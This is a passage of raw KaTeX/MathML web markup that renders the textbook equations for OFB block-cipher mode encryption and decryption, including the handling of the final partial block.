displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>O</mi><mi>j</mi></msub><mo>=</mo><mi>C</mi><mi>I</mi><mi>P</mi><msub><mi>H</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><msub><mi>O</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>for </mtext><mi>j</mi><mo>=</mo><mn>2</mn><mo>⋯</mo><mi>n</mi><mo separator=\"true\">;</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>C</mi><mi>j</mi></msub><mo>=</mo><msub><mi>P</mi><mi>j</mi></msub><mo>⊕</mo><msub><mi>O</mi><mi>j</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>for </mtext><mi>j</mi><mo>=</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo>⋯</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo separator=\"true\">;</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msubsup><mi>C</mi><mi>n</mi><mo>∗</mo></msubsup><mo>=</mo><msubsup><mi>P</mi><mi>n</mi><mo>∗</mo></msubsup><mo>⊕</mo><mo stretchy=\"false\">(</mo><msub><mi>O</mi><mi>j</mi></msub><mo>&gt;</mo><mo>&gt;</mo><mo stretchy=\"false\">(</mo><mi>b</mi><mo>−</mo><mi>u</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>OFB Decryption:</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>O</mi><mn>1</mn></msub><mo>=</mo><mi>C</mi><mi>I</mi><mi>P</mi><msub><mi>H</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><mi>I</mi><mi>V</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>O</mi><mi>j</mi></msub><mo>=</mo><mi>C</mi><mi>I</mi><mi>P</mi><msub><mi>H</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><msub><mi>O</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>for </mtext><mi>j</mi><mo>=</mo><mn>2</mn><mo>⋯</mo><mi>n</mi><mo separator=\"true\">;</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>P</mi><mi>j</mi></msub><mo>=</mo><msub><mi>C</mi><mi>j</mi></msub><mo>⊕</mo><msub><mi>O</mi><mi>j</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>for </mtext><mi>j</mi><mo>=</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo>⋯</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo separator=\"true\">;</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msubsup><mi>P</mi><mi>n</mi><mo>∗</mo></msubsup><mo>=</mo><msubsup><mi>C</mi><mi>n</mi><mo>∗</mo></msubsup><mo>⊕</mo><mo stretchy=\"false\">(</mo><msub><mi>O</mi><mi>j</mi></msub><mo>&gt;</mo><mo>&gt;</mo><mo stretchy=\"false\">(</mo><mi>b</mi><mo>−</mo><mi>u</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;\\text{OFB Encryption:}\n&amp;&amp;O_1=CIPH_K(IV)\\\\\n&amp;&amp;&amp;O_j=CIPH_K(O_{j-1}) &amp;&amp; \\text{for}\\ j=2\\cdots n;\\\\\n&amp;&amp;&amp;C_j=P_j\\oplus O_{j} &amp;&amp; \\text{for}\\ j=1,2\\cdots n-1;\\\\\n&amp;&amp;&amp;C_n^*=P_n^*\\oplus (O_{j}&gt;&gt;(b-u))\\\\\n\\\\\n&amp;\\text{OFB Decryption:}\n&amp;&amp;O_1=CIPH_K(IV)\\\\\n&amp;&amp;&amp;O_j=CIPH_K(O_{j-1}) &amp;&amp; \\text{for}\\ j=2\\cdots n;\\\\\n&amp;&amp;&amp;P_j=C_j\\oplus O_{j} &amp;&amp; \\text{for}\\ j=1,2\\cdots n-1;\\\\\n&amp;&amp;&amp;P_n^*=C_n^*\\oplus (O_{j}&gt;&gt;(b-u))\\\\\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:13.500000000000002em;vertical-align:-6.500000000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:7.000000000000001em;\"><span style=\"top:-9em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-7.5em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.5em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.4999999999999991em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:8.881784197001252e-16em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.5000000000000009em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:3.000000000000001em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.500000000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:7.000000000000001em;\"><span style=\"top:-9.16em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">OFB Encryption:</span></span></span></span><span style=\"top:-7.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:-6.16em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:-4.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:-1.6599999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">OFB Decryption:</span></span></span></span><span style=\"top:-0.15999999999999925em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:1.3400000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:2.8400000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.500000000000001em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:7.000000000000001em;\"><span style=\"top:-9em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-7.5em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.5em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.4999999999999991em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:8.881784197001252e-16em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.5000000000000009em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:3.000000000000001em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.500000000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:7.000000000000001em;\"><span style=\"top:-9.16em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mclose\">)</span></span></span><span style=\"top:-7.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-6.16em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-4.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7386959999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">∗</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7386959999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">∗</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span></span></span><span style=\"top:-1.6599999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mclose\">)</span></span></span><span style=\"top:-0.15999999999999925em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:1.3400000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:2.8400000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7386959999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing 